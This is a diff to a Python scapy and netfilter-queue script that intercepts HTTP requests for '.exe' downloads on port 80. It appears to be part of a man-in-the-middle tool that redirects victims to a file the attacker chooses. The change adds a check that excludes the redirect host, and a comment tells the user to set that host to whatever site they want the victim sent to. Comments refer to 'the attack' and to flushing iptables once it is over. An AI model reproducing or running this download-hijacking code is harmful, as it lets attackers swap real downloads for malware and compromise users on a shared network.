@@ -14,7 +14,7 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())   
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            if ".exe" in scapy_packet[scapy.Raw].load:
+            if ".exe" in scapy_packet[scapy.Raw].load and "example.org" not in scapy_packet[scapy.Raw].load:
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
 
@@ -47,3 +47,5 @@ queue.run()
 
 #After the attack is over dont forget to flush the ip tables 
 #iptables --flush
+
+#replace example.org with the website you want to redirect the user to.
